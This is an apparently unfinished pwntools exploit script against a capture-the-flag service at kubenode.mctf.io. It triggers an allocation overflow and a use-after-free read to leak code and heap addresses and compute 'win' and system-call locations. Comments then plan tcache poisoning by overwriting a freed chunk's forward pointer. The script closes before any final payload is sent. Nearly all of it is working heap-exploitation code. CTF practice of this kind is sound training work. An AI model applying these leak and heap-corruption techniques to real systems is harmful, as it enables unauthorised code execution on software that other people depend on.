from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'2')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'8')
p.recvuntil(b'data:\n')
p.send(b'A' * 16)
recv_menu()

p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Validator    : ')
validator = int(p.recvline().strip(), 16)
base_addr = validator - 0x136c
win_func = base_addr + 0x14a8
system_call = base_addr + 0x14b7
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")
recv_menu()

p.sendline(b'4')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
recv_menu()

p.sendline(b'2')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')

leak = p.recvuntil(b'\n\n===')[:-5]
heap_leak = u64(leak[:8])
print(f"Heap leak: {hex(heap_leak)}")

# Re-allocate with overflow
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'1')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')

# Find what to overwrite...
# Actually if we can do UAF, can we do tcache poisoning?
# tcache stores fd in the first 8 bytes. We can overwrite the fd pointer using the overflow!
# We can allocate a chunk, delete it (it goes into tcache), and then use the overflow to overwrite its fd pointer!
p.close()
